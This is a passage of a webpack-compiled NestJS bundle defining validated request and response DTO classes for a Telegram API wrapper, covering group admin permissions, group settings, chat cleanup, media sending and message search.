        description: 'Maximum date (UNIX timestamp) for messages to be deleted',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsInt)(),
    __metadata("design:type", Number)
], DeleteHistoryDto.prototype, "maxDate", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/group-operations.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/group-operations.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.createGroupDto = exports.ChatCleanupDto = exports.GroupSettingsDto = exports.AdminOperationDto = exports.GroupMemberOperationDto = exports.BaseGroupOperationDto = exports.AdminPermissionsDto = exports.AdminPermission = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var AdminPermission;
(function (AdminPermission) {
    AdminPermission["CHANGE_INFO"] = "changeInfo";
    AdminPermission["POST_MESSAGES"] = "postMessages";
    AdminPermission["EDIT_MESSAGES"] = "editMessages";
    AdminPermission["DELETE_MESSAGES"] = "deleteMessages";
    AdminPermission["BAN_USERS"] = "banUsers";
    AdminPermission["INVITE_USERS"] = "inviteUsers";
    AdminPermission["PIN_MESSAGES"] = "pinMessages";
    AdminPermission["ADD_ADMINS"] = "addAdmins";
    AdminPermission["ANONYMOUS"] = "anonymous";
    AdminPermission["MANAGE_CALL"] = "manageCall";
})(AdminPermission || (exports.AdminPermission = AdminPermission = {}));
class AdminPermissionsDto {
    constructor() {
        this.changeInfo = true;
        this.postMessages = true;
        this.editMessages = true;
        this.deleteMessages = true;
        this.banUsers = true;
        this.inviteUsers = true;
        this.pinMessages = true;
        this.addAdmins = false;
        this.anonymous = false;
        this.manageCall = true;
    }
}
exports.AdminPermissionsDto = AdminPermissionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to change group info', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "changeInfo", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to post messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "postMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to edit messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "editMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to delete messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "deleteMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to ban users', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "banUsers", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to invite users', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "inviteUsers", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to pin messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "pinMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to add new admins', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "addAdmins", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to remain anonymous', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "anonymous", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to manage voice chats', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "manageCall", void 0);
class BaseGroupOperationDto {
}
exports.BaseGroupOperationDto = BaseGroupOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Group ID' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], BaseGroupOperationDto.prototype, "groupId", void 0);
class GroupMemberOperationDto extends BaseGroupOperationDto {
}
exports.GroupMemberOperationDto = GroupMemberOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Array of user IDs', type: [String] }),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], GroupMemberOperationDto.prototype, "members", void 0);
class AdminOperationDto extends BaseGroupOperationDto {
}
exports.AdminOperationDto = AdminOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User ID to promote/demote' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], AdminOperationDto.prototype, "userId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to promote or demote', required: true }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminOperationDto.prototype, "isPromote", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Admin permissions', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => AdminPermissionsDto),
    __metadata("design:type", AdminPermissionsDto)
], AdminOperationDto.prototype, "permissions", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Custom admin rank/title', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], AdminOperationDto.prototype, "rank", void 0);
class GroupSettingsDto extends BaseGroupOperationDto {
    constructor() {
        super(...arguments);
        this.megagroup = true;
        this.forImport = false;
    }
}
exports.GroupSettingsDto = GroupSettingsDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group title', required: false }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group username', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group description', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Address or location of the group', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "address", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Slow mode delay in seconds', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], GroupSettingsDto.prototype, "slowMode", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is a megagroup', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], GroupSettingsDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is for import', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], GroupSettingsDto.prototype, "forImport", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Member restrictions', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsObject)(),
    __metadata("design:type", Object)
], GroupSettingsDto.prototype, "memberRestrictions", void 0);
class ChatCleanupDto extends BaseGroupOperationDto {
}
exports.ChatCleanupDto = ChatCleanupDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID to clean up' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ChatCleanupDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Delete messages before this date', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsDateString)(),
    (0, class_transformer_1.Transform)(({ value }) => value ? new Date(value) : undefined),
    __metadata("design:type", Date)
], ChatCleanupDto.prototype, "beforeDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Only delete media messages', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ChatCleanupDto.prototype, "onlyMedia", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude pinned messages', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ChatCleanupDto.prototype, "excludePinned", void 0);
class createGroupDto {
    constructor() {
        this.slowMode = 0;
        this.megagroup = true;
        this.broadcast = true;
        this.forImport = false;
    }
}
exports.createGroupDto = createGroupDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Group title', required: true }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], createGroupDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group description', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], createGroupDto.prototype, "about", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Address or location of the group', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], createGroupDto.prototype, "address", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Slow mode delay in seconds', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], createGroupDto.prototype, "slowMode", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is a megagroup', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], createGroupDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is a broadcast', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], createGroupDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is for import', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], createGroupDto.prototype, "forImport", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Member restrictions', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsObject)(),
    __metadata("design:type", Object)
], createGroupDto.prototype, "memberRestrictions", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/index.ts":
/*!**********************************************!*\
  !*** ./src/components/Telegram/dto/index.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AdminPermission = exports.MediaType = exports.BatchOperationType = void 0;
__exportStar(__webpack_require__(/*! ../../../interfaces/telegram */ "./src/interfaces/telegram.ts"), exports);
__exportStar(__webpack_require__(/*! ./batch-operations.dto */ "./src/components/Telegram/dto/batch-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./media-operations.dto */ "./src/components/Telegram/dto/media-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./schedule-operations.dto */ "./src/components/Telegram/dto/schedule-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./metadata-operations.dto */ "./src/components/Telegram/dto/metadata-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./group-operations.dto */ "./src/components/Telegram/dto/group-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./contact-management.dto */ "./src/components/Telegram/dto/contact-management.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./profile-settings.dto */ "./src/components/Telegram/dto/profile-settings.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./view-once-media.dto */ "./src/components/Telegram/dto/view-once-media.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./create-bot.dto */ "./src/components/Telegram/dto/create-bot.dto.ts"), exports);
var batch_operations_dto_1 = __webpack_require__(/*! ./batch-operations.dto */ "./src/components/Telegram/dto/batch-operations.dto.ts");
Object.defineProperty(exports, "BatchOperationType", ({ enumerable: true, get: function () { return batch_operations_dto_1.BatchOperationType; } }));
var media_operations_dto_1 = __webpack_require__(/*! ./media-operations.dto */ "./src/components/Telegram/dto/media-operations.dto.ts");
Object.defineProperty(exports, "MediaType", ({ enumerable: true, get: function () { return media_operations_dto_1.MediaType; } }));
var group_operations_dto_1 = __webpack_require__(/*! ./group-operations.dto */ "./src/components/Telegram/dto/group-operations.dto.ts");
Object.defineProperty(exports, "AdminPermission", ({ enumerable: true, get: function () { return group_operations_dto_1.AdminPermission; } }));


/***/ }),

/***/ "./src/components/Telegram/dto/media-operations.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/media-operations.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.VoiceMessageDto = exports.SendMediaAlbumDto = exports.MediaAlbumItemDto = exports.SendMediaDto = exports.MediaFilterDto = exports.MediaSearchDto = exports.BaseMediaOperationDto = exports.MediaType = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var MediaType;
(function (MediaType) {
    MediaType["PHOTO"] = "photo";
    MediaType["VIDEO"] = "video";
    MediaType["DOCUMENT"] = "document";
    MediaType["VOICE"] = "voice";
    MediaType["AUDIO"] = "audio";
})(MediaType || (exports.MediaType = MediaType = {}));
class BaseMediaOperationDto {
}
exports.BaseMediaOperationDto = BaseMediaOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID for media operation' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BaseMediaOperationDto.prototype, "chatId", void 0);
class MediaSearchDto extends BaseMediaOperationDto {
    constructor() {
        super(...arguments);
        this.limit = 50;
    }
}
exports.MediaSearchDto = MediaSearchDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Media types to include', enum: MediaType, isArray: true }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsEnum)(MediaType, { each: true }),
    __metadata("design:type", Array)
], MediaSearchDto.prototype, "types", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message offset', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], MediaSearchDto.prototype, "offset", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Items per page', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], MediaSearchDto.prototype, "limit", void 0);
class MediaFilterDto extends MediaSearchDto {
}
exports.MediaFilterDto = MediaFilterDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Start date for filtering', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_transformer_1.Transform)(({ value }) => value ? new Date(value).toISOString() : undefined),
    __metadata("design:type", String)
], MediaFilterDto.prototype, "startDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'End date for filtering', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_transformer_1.Transform)(({ value }) => value ? new Date(value).toISOString() : undefined),
    __metadata("design:type", String)
], MediaFilterDto.prototype, "endDate", void 0);
class SendMediaDto extends BaseMediaOperationDto {
}
exports.SendMediaDto = SendMediaDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'URL of the media file' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsUrl)(),
    __metadata("design:type", String)
], SendMediaDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Caption for the media', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMediaDto.prototype, "caption", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Filename for the media' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMediaDto.prototype, "filename", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Type of media', enum: MediaType }),
    (0, class_validator_1.IsEnum)(MediaType),
    __metadata("design:type", String)
], SendMediaDto.prototype, "type", void 0);
class MediaAlbumItemDto {
}
exports.MediaAlbumItemDto = MediaAlbumItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'URL of the media file' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsUrl)(),
    __metadata("design:type", String)
], MediaAlbumItemDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Type of media', enum: MediaType }),
    (0, class_validator_1.IsEnum)(MediaType),
    __metadata("design:type", String)
], MediaAlbumItemDto.prototype, "type", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Caption for the media item', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], MediaAlbumItemDto.prototype, "caption", void 0);
class SendMediaAlbumDto extends BaseMediaOperationDto {
}
exports.SendMediaAlbumDto = SendMediaAlbumDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Array of media items', type: [MediaAlbumItemDto] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.ValidateNested)({ each: true }),
    (0, class_transformer_1.Type)(() => MediaAlbumItemDto),
    __metadata("design:type", Array)
], SendMediaAlbumDto.prototype, "media", void 0);
class VoiceMessageDto extends BaseMediaOperationDto {
}
exports.VoiceMessageDto = VoiceMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'URL of the voice message file' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsUrl)(),
    __metadata("design:type", String)
], VoiceMessageDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Duration of voice message in seconds', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], VoiceMessageDto.prototype, "duration", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Caption for the voice message', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], VoiceMessageDto.prototype, "caption", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/message-search.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/Telegram/dto/message-search.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchMessagesResponseDto = exports.MessageTypeResult = exports.SearchMessagesDto = exports.SearchScope = exports.MessageMediaType = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
var MessageMediaType;
(function (MessageMediaType) {
    MessageMediaType["ALL"] = "all";
    MessageMediaType["TEXT"] = "text";
    MessageMediaType["PHOTO"] = "photo";
    MessageMediaType["VIDEO"] = "video";
    MessageMediaType["VOICE"] = "voice";
    MessageMediaType["DOCUMENT"] = "document";
    MessageMediaType["ROUND_VIDEO"] = "roundVideo";
    MessageMediaType["ROUND_VOICE"] = "roundVoice";
    MessageMediaType["STICKER"] = "sticker";
    MessageMediaType["ANIMATION"] = "animation";
    MessageMediaType["CONTACT"] = "contact";
    MessageMediaType["MUSIC"] = "music";
    MessageMediaType["CHAT_PHOTO"] = "chatPhoto";
})(MessageMediaType || (exports.MessageMediaType = MessageMediaType = {}));
var SearchScope;
(function (SearchScope) {
    SearchScope["CHAT"] = "chat";
    SearchScope["GLOBAL"] = "global";
})(SearchScope || (exports.SearchScope = SearchScope = {}));
class SearchMessagesDto {
}
exports.SearchMessagesDto = SearchMessagesDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Chat ID to search in (required for chat-specific search)',
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], SearchMessagesDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Search query string',
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], SearchMessagesDto.prototype, "query", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Filter by multiple types options',
        isArray: true,
        enum: MessageMediaType,
        example: [MessageMediaType.TEXT, MessageMediaType.PHOTO],
        default: [MessageMediaType.ALL, MessageMediaType.TEXT, MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.VOICE, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VIDEO, MessageMediaType.ROUND_VOICE, MessageMediaType.STICKER, MessageMediaType.ANIMATION, MessageMediaType.CONTACT, MessageMediaType.MUSIC, MessageMediaType.CHAT_PHOTO],
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsEnum)(MessageMediaType, { each: true }),
    (0, class_transformer_1.Type)(() => String),
    __metadata("design:type", Array)
], SearchMessagesDto.prototype, "types", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Minimum message ID for filtering',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "minId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum message ID for filtering',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "maxId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum number of messages to retrieve',
        minimum: 1,
        maximum: 500,
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(1),
    (0, class_validator_1.Max)(500),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "limit", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Offset ID for pagination',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "offsetId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Offset date as Unix timestamp',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "offsetDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Start date for filtering messages by date range',
    }),
    (0, class_transformer_1.Type)(() => Date),
    (0, class_validator_1.IsDate)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Date)
], SearchMessagesDto.prototype, "startDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'End date for filtering messages by date range',
    }),
    (0, class_transformer_1.Type)(() => Date),
    (0, class_validator_1.IsDate)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Date)
], SearchMessagesDto.prototype, "endDate", void 0);
class MessageTypeResult {
}
exports.MessageTypeResult = MessageTypeResult;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Array of message IDs matching the search criteria',
        type: [Number],
        example: [1001, 1005, 1010]
    }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsInt)({ each: true }),
    __metadata("design:type", Array)
], MessageTypeResult.prototype, "messages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Total count of messages matching the search criteria',
        example: 3
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    __metadata("design:type", Number)
], MessageTypeResult.prototype, "total", void 0);
class SearchMessagesResponseDto {
}
exports.SearchMessagesResponseDto = SearchMessagesResponseDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'All message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "all", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Text message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "text", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Photo message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "photo", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Video message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "video", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Voice message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
